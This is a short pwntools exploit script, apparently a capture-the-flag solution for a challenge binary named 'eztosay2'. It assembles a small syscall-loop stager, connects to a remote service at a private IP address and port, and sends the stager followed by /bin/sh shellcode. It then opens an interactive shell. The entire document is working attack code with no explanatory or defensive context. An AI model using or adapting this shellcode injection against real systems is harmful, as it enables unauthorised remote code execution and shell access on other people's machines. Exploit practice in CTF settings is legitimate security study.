from pwn import *
context.log_level="debug"
context.arch="amd64"
code="""
start:
	syscall
	push rcx
	pop rsi
	mov dl, 0x40
	jmp start
"""
payload=asm(code,arch="x86_64")
# conn=process("./eztosay2")
conn=remote("10.131.1.19",60010)
print len(payload)
# pause()
shellcode=asm(shellcraft.sh())

conn.sendlineafter("Give me your code :",payload+shellcode)
sleep(1)

conn.interactive()